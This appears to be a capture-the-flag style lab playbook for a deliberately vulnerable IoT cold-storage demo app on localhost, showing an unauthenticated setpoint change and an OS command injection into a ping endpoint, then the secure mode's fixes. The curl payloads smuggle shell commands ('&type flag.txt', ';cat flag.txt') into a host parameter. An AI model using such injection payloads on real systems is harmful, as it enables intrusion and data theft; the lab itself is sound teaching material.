# Attack Playbook — ParaLabz ColdRoom

**Objective:** Exploit the insecure mode of the ColdRoom application to bypass authorization, achieve Remote Code Execution (RCE), and capture the flag.
**Target:** `http://127.0.0.1:5000`
**Rules of Engagement:** Only run these commands against your local instance. Do not use these techniques on systems you do not own.

---

## Phase 1: Reconnaissance

First, we need to map the application's attack surface. The application simulates an IoT cold storage controller, which typically exposes diagnostic or status endpoints.

**1. Check the application status:**

```bash
curl.exe -s http://127.0.0.1:5000/api/status
```

*Expected Output:* A JSON response showing the current temperature, mode, and available limits.

---

## Phase 2: Exploitation (Insecure Mode)

Start the application in vulnerable mode:

```bash
python app.py --demo-insecure
```

### Vulnerability 1: Missing Authorization

The `/api/setpoint` endpoint allows changing the physical temperature of the device. In a secure system, this requires an operator token. In insecure mode, the authorization check is completely missing.

**The Attack:** Send a POST request to change the setpoint without providing any authentication headers.

```bash
curl.exe -i -X POST http://127.0.0.1:5000/api/setpoint -H "Content-Type: application/json" --data-binary "@demo/setpoint.json"
```

*Expected Output:* `HTTP 200 OK`. 
*Result:* The UI will show the temperature dropping. This simulates a physical tampering attack.

### Vulnerability 2: OS Command Injection (RCE)

The `/api/ping` endpoint takes a `host` parameter and uses Python's `os.popen()` to ping it. Because `os.popen()` executes commands through the system shell, we can inject arbitrary OS commands using command separators (`&` on Windows, `;` on Linux).

**The Attack:** Inject a command to read the hidden `flag.txt` file. We must URL-encode the separator (`%26` for Windows, `%3B` for Linux) so the web server passes it to the shell correctly.

**Windows (Read the flag):**

```bash
curl.exe "http://127.0.0.1:5000/api/ping?host=127.0.0.1%26type+flag.txt"
```

**Linux/Mac (Read the flag):**

```bash
curl "http://127.0.0.1:5000/api/ping?host=127.0.0.1%3Bcat+flag.txt"
```

*Expected Output:* The output of the ping command, followed by the contents of the flag file: `FLAG{IoT_AUTH_BYPASS_MASTER}`

---

## Phase 3: Remediation (Protected Mode)

Restart the application in secure mode:

```bash
python app.py
```

Now, attempt to run the exact same exploits.

**1. Bypassing Authorization:**

```bash
curl.exe -i -X POST http://127.0.0.1:5000/api/setpoint -H "Content-Type: application/json" --data-binary "@demo/setpoint.json"
```

*Result:* `HTTP 401 Unauthorized`. The system now requires a valid Bearer token.

**2. Command Injection:**

```bash
curl.exe "http://127.0.0.1:5000/api/ping?host=127.0.0.1%26type+flag.txt"
```

*Result:* `HTTP 400 Bad Request`. The secure endpoint uses strict regex validation to ensure the input is a valid IP address, and it uses `subprocess.run()` with a list of arguments, which neutralizes the injection attempt.

---

## The Takeaway

This lab demonstrates the difference between authentication (who are you?) and authorization (are you allowed to do this?). It also highlights why passing user input directly to a shell is one of the most dangerous mistakes a developer can make.